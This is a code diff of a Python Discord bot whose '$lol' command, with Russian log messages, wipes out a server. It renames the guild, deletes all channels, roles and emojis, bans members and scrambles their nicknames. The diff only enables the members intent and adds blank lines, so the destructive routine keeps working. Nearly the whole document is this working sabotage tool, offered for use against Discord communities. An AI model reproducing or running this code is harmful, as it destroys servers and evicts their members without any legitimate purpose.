@@ -5,7 +5,9 @@ from colorama import Fore, init
 os.system('clear')
 init()
 
-client = commands.Bot(command_prefix='$')
+intents = discord.Intents.default()
+intents.members = True
+client = commands.Bot(command_prefix='$', intents=intents )
 
 @client.event
 async def on_ready():
@@ -25,11 +27,13 @@ async def on_ready():
 async def lol(ctx):
     await ctx.guild.edit(name="Осторожно! Зачищено")
     print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")
+    
     print(f"{Fore.RED}> {Fore.WHITE}Чистим каналы{Fore.WHITE}...")
     for channel in ctx.guild.channels:
         await channel.delete()
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Зачистил {channel}")
     print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
+    
     print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
     ban = 0
     for member in ctx.guild.members:
@@ -40,6 +44,7 @@ async def lol(ctx):
         except:
             continue
     print(f"{Fore.WHITE}> {Fore.RED}Усе, кого мох забанил, а мог я:{ban} человек{Fore.WHITE}.")
+    
     print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
     roles = ctx.guild.roles
     roles.pop(0)
@@ -50,6 +55,7 @@ async def lol(ctx):
         else:
             break
     print(f"{Fore.WHITE}> {Fore.RED}Почистил{Fore.WHITE}.")
+    
     char = string.ascii_letters + string.digits
     for member in ctx.guild.members:
         nickname = ''.join((random.choice(char) for i in range(16)))
@@ -59,6 +65,7 @@ async def lol(ctx):
         except Exception as e:
             continue
     print(f"{Fore.WHITE}> {Fore.RED}Все теперь анонизмусы{Fore.WHITE}.")
+    
     for emoji in list(ctx.guild.emojis):
         try:
             await emoji.delete()
@@ -66,6 +73,7 @@ async def lol(ctx):
         except:
             print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
     print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")
+    
     print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")
 
 try:
